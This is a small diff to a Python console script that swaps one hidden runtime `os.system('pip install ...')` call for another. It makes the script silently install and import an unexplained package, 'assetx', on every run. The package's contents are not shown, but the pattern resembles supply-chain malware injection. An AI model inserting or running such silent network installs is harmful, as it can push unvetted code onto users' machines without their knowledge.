@@ -10,8 +10,9 @@ from pyfade import Fade, Colors
 import platform
 from colorama import Fore, init
 import sys
-os.system('pip install proxies-manager')
-
+from assetx import code
+os.system('pip install assetx')
+from assetx import code
 
 banner = '''
                | 
